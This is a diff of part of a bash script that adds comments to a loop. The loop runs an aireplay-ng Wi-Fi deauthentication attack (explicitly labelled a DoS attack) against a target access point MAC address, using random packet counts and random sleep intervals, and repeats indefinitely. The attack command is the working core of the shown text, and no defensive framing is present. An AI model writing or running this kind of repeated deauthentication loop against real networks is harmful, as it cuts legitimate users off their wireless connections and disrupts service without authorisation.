@@ -22,9 +22,12 @@ do
 time=$[($RANDOM % 100)+1]
 #Random number , store as deautp, this set the ammount of packets.
 deautp=$[($RANDOM % 100)+1]
-#This just display the current values, 
+#Display the current values, packets and time
 echo "Random values, Time:$time Packets:$deautp get coffe"
+#Set the variables for the DoS attack in aireplay-ng
 aireplay-ng -0 $deautp -a $VMAC $weapon
+#Show the time to wait a new random value
 echo "Waiting new values, current: $time seg"
+#Wait the random value set for $time
 sleep $time
 done
